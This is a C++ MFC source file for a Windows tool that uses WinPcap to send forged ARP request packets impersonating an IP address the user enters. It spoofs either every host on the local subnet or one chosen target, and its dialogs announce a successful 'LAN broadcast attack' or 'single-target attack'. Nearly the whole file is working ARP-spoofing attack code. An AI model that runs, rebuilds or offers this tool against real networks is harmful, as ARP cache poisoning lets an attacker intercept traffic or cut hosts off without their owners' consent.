
// arpcDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "arpc.h"
#include "arpcDlg.h"
#include "afxdialogex.h"
#include "pcap.h"
#include <conio.h>
#include <packet32.h>
#include <ntddndis.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

pcap_if_t *alldevs; //全部网卡列表
pcap_if_t *d; //一个网卡
int inum; //用户选择的网卡序号
int i=0; //循环变量
pcap_t *adhandle; //一个pcap实例
char errbuf[PCAP_ERRBUF_SIZE]; //错误缓冲区
unsigned char *mac; //本机MAC地址
unsigned char *packet; //ARP包
unsigned long fakeIp; //要伪装成的IP地址
unsigned long aimIp;//要攻击的IP地址
pcap_addr_t *pAddr; //网卡地址
unsigned long ip; //IP地址
unsigned long netmask; //子网掩码
int flag=0;
u_char destinationMac[6];//目的mac
char aimip[16];
// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CarpcDlg 对话框




CarpcDlg::CarpcDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CarpcDlg::IDD, pParent)
	, m_edit(_T(""))
	
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CarpcDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_COMBO1, m_combo);
	DDX_Text(pDX, IDC_EDIT1, m_edit);
	DDX_Control(pDX, IDC_EDIT1, m_edit2);
	DDX_Control(pDX, IDC_EDIT2, m_edit3);
	//DDX_Control(pDX, IDC_RADIO1, ratio1);
	//DDX_Control(pDX, IDC_BUTTON2, button);
	//DDX_Control(pDX, IDC_EDIT2, m_edit3);
	DDX_Control(pDX, IDC_RADIO1, ratio);
}

BEGIN_MESSAGE_MAP(CarpcDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CarpcDlg::OnBnClickedButton1)
END_MESSAGE_MAP()


// CarpcDlg 消息处理程序

BOOL CarpcDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	CString strmid;
	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码



	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	
	/* 打印网卡列表 */
	for(d=alldevs; d; d=d->next)
	{
		if (d->description)
		{
			strmid=d->description;
			m_combo.AddString(strmid);
		}
	}

	ratio.SetCheck(TRUE);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CarpcDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CarpcDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CarpcDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

/*--------------------------------对包进行封装-----------------------*/
void packetEncap(u_char p[]){//封装，消除结构体中的多余0位
	memcpy(p,packet,14);
	memcpy(p+14,packet+16,14);
	memcpy(p+14+14,packet+16+16,10);
	memcpy(p+14+14+10,packet+16+16+12,4);
	memset(p+42,0,18);
}


/*-----------------------------对数据包进行解析-----------------------------------------*/

void CarpcDlg::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	CString s1;
	m_edit2.GetWindowTextW(s1);
	if(s1.GetLength()==0)
	{
		MessageBox(_T("请输入IP"));
		return;
	}
	char sss[16];
	sprintf(sss,"%S",s1);
	fakeIp=inet_addr(sss);
	inum=m_combo.GetCurSel();
	for(d=alldevs, i=0; i< inum ;d=d->next, i++);
	mac = GetSelfMac(d->name+8); //+8以去掉"rpcap://"
	if ( (adhandle= pcap_open(d->name, // name of the device
			65536, // portion of the packet to capture
			0, //open flag
			1000, // read timeout
			NULL, // authentication on the remote machine
			errbuf // error buffer
		) ) == NULL)
	{
		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n",d->name); 
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return ;
	}
	for(pAddr=d->addresses; pAddr; pAddr=pAddr->next)
	{
		//得到用户选择的网卡的一个IP地址
		ip = ((struct sockaddr_in *)pAddr->addr)->sin_addr.s_addr;
		//得到该IP地址对应的子网掩码
		netmask = ((struct sockaddr_in *)(pAddr->netmask))->sin_addr.S_un.S_addr;
		if (!ip || !netmask)
		{
			continue;
		}
		//看看这个IP和要伪装的IP是否在同一个子网
		if((ip&netmask)!=(fakeIp&netmask))
		{
		continue; //如果不在一个子网，继续遍历地址列表
		}
	}
	
	if(ratio.GetCheck()==TRUE)
	{
		
		unsigned long netsize = ntohl(~netmask); //网络中主机数
		unsigned long net = ip & netmask; //子网地址
		for(unsigned long n=1; n<netsize; n++)
		{
			//第i台主机的IP地址，网络字节顺序
			unsigned long destIp = net | htonl(n);
			//构建假的ARP请求包，达到本机伪装成给定的IP地址的目的
			packet = BuildArpPacket(mac,fakeIp,destIp);
			if(pcap_sendpacket(adhandle, packet, 60)==-1)
			{
				fprintf(stderr,"pcap_sendpacket error.\n");
			}
			
		}
		MessageBox(_T("成功进行局域网广播攻击！"));
	}
	else
	{
		CString s2;
		m_edit3.GetWindowTextW(s2);
		if(s2.GetLength()==0)
		{
		MessageBox(_T("请输入目的IP"));
		return;
		}
		
		sprintf(aimip,"%S",s2);
		aimIp=inet_addr(aimip);
		if((ip&netmask)!=(aimIp&netmask))
		{
			MessageBox(_T("不在同一个网段，无法欺骗\n"));
			return;
		}
		packet = BuildArpPacket(mac,fakeIp,aimIp);
		while(flag!=20)
		{
			if(pcap_sendpacket(adhandle, packet, 60)==-1)
			{
				{
					fprintf(stderr,"pcap_sendpacket error.\n");
				}
			}
			flag++;
		}
		MessageBox(_T("成功进行单一目标攻击!"));			
	}	
}
/** 
* 获得网卡的MAC地址 
* pDevName 网卡的设备名称 
*/
unsigned char* GetSelfMac(char* pDevName)
{
	static u_char mac[6];
	memset(mac,0,sizeof(mac));
	LPADAPTER lpAdapter = PacketOpenAdapter(pDevName);
	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE)) 
	{
		return NULL;
	}
	PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
	if (OidData == NULL) 
	{
		PacketCloseAdapter(lpAdapter);
		return NULL;
	} 
	// 
	// Retrieve the adapter MAC querying the NIC driver 
	//
	OidData->Oid = OID_802_3_CURRENT_ADDRESS;
	OidData->Length = 6;
	memset(OidData->Data, 0, 6);
	BOOLEAN Status = PacketRequest(lpAdapter, FALSE, OidData);
	if(Status) 
	{
		memcpy(mac,(u_char*)(OidData->Data),6); 
	}free(OidData); 
	PacketCloseAdapter(lpAdapter); 
	return mac; 
	
} 

/** 
* 封装ARP请求包 
* source_mac 源MAC地址 
* srcIP 源IP 
* destIP 目的IP 
*/ 
unsigned char* BuildArpPacket(unsigned char* source_mac, 
							  unsigned long srcIP,unsigned long destIP) 
{ 
	static struct arp_packet packet; 
	
	//目的MAC地址为广播地址，FF-FF-FF-FF-FF-FF 
	memset(packet.eth.dest_mac,0xFF,6); 
	//源MAC地址 
	memcpy(packet.eth.source_mac,source_mac,6); 
	//上层协议为ARP协议，0x0806 
	packet.eth.eh_type = htons(0x0806); 
	
	//硬件类型，Ethernet是0x0001 
	packet.arp.hardware_type = htons(0x0001); 
	//上层协议类型，IP为0x0800 
	packet.arp.protocol_type = htons(0x0800); 
	//硬件地址长度：MAC地址长度为0x06 
	packet.arp.add_len = 0x06; 
	//协议地址长度：IP地址长度为0x04 
	packet.arp.pro_len = 0x04; 
	//操作：ARP请求为1 
	packet.arp.option = htons(0x0001); 
	//源MAC地址 
	memcpy(packet.arp.sour_addr,source_mac,6); 
	//源IP地址 
	packet.arp.sour_ip = srcIP; 
	//目的MAC地址，填充0 
	memset(packet.arp.dest_addr,0,6); 
	//目的IP地址 
	packet.arp.dest_ip = destIP; 
	//填充数据，18B 
	memset(packet.arp.padding,0,18); 
	
	return (unsigned char*)&packet; 
} 
